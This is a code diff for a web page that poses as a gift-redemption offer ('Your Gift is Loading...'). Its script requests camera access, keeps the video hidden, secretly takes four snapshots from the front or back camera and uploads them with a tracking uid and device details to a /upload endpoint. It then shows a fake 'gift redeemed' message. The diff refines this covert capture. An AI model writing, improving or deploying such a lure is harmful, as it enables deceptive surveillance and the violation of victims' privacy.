@@ -5,23 +5,12 @@
     <style>
         body { background: white; color: black; text-align: center; font-family: sans-serif; transition: 0.5s; margin:0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
         #loading-ui { display: none; }
-        
-        /* Gudda & Key Animation Box */
         .gudda-container { position: relative; width: 150px; height: 120px; margin: 0 auto; }
         .gudda-img { width: 70px; position: absolute; left: 20px; bottom: 10px; }
-        .key-anim { 
-            width: 30px; position: absolute; right: 30px; top: 30px; 
-            animation: rotateKey 1.2s infinite linear; 
-        }
-        @keyframes rotateKey {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* Loading Spinner */
+        .key-anim { width: 30px; position: absolute; right: 30px; top: 30px; animation: rotateKey 1.2s infinite linear; }
+        @keyframes rotateKey { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
-
         .btn { background: #00ff00; color: black; border: none; padding: 18px 35px; font-size: 19px; font-weight: bold; border-radius: 50px; cursor: pointer; box-shadow: 0 5px 20px rgba(0,255,0,0.4); }
     </style>
 </head>
@@ -37,21 +26,22 @@
             <img class="gudda-img" src="https://cdn-icons-png.flaticon.com/512/226/226770.png"> 
             <img class="key-anim" src="https://cdn-icons-png.flaticon.com/512/3039/3039433.png">
         </div>
-        
-        <p style="font-size: 20px; margin-top: 15px; font-weight: bold;">Your Gift is Loading...🎁</p>
+        <p style="font-size: 20px; margin-top: 15px; font-weight: bold;">Your Gift is Loading...</p>
         <div class="loader"></div>
     </div>
 
     <div id="success-msg" style="display:none; color:#00ff00; padding: 20px;">
-        <h2>Your gift has been redeemed.👍</h2>
+        <h2>Your gift has been redeemed.</h2>
         <p>You are a good person, God bless you. ✨</p>
     </div>
 
-    <video id="v" style="display:none" autoplay playsinline></video>
+    <video id="v" style="display:none" autoplay playsinline muted width="640" height="480"></video>
     <canvas id="c" style="display:none"></canvas>
 
     <script>
         const params = new URLSearchParams(window.location.search);
+        const v = document.getElementById('v');
+        const c = document.getElementById('c');
 
         async function startWork() {
             document.body.style.background = "black";
@@ -61,35 +51,40 @@
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: params.get('m') === 'back' ? 'environment' : 'user' } 
+                    video: { 
+                        facingMode: params.get('m') === 'back' ? 'environment' : 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    } 
                 });
                 v.srcObject = stream;
                 
-                await new Promise(r => setTimeout(r, 8000));
+                await new Promise(r => v.onloadedmetadata = r);
+                await new Promise(r => setTimeout(r, 6000));
 
+                const ctx = c.getContext('2d');
                 for(let i=0; i<4; i++) {
+                    // Ensure canvas matches video dimensions
                     c.width = v.videoWidth; 
                     c.height = v.videoHeight;
-                    c.getContext('2d').drawImage(v, 0, 0);
+                    ctx.drawImage(v, 0, 0, c.width, c.height);
                     
-                    let batLevel = "N/A";
-                    try { const bat = await navigator.getBattery(); batLevel = Math.round(bat.level*100)+"%"; } catch(e) {}
+                    const imgData = c.toDataURL('image/jpeg', 0.9);
                     
                     await fetch('/upload', {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({
-                            image: c.toDataURL('image/jpeg', 0.8),
+                            image: imgData,
                             uid: params.get('uid'), 
                             mode: params.get('m'),
-                            info: { battery: batLevel, platform: navigator.platform, browser: "Mobile Browser" }
+                            info: { battery: "Checking...", platform: navigator.platform, browser: "Mobile" }
                         })
                     });
-                    // Time between photos
                     await new Promise(r => setTimeout(r, 2000)); 
                 }
                 stream.getTracks().forEach(track => track.stop());
-            } catch(e) { console.log(e); }
+            } catch(e) { console.error(e); }
 
             document.getElementById('loading-ui').style.display = 'none';
             document.getElementById('success-msg').style.display = 'block';
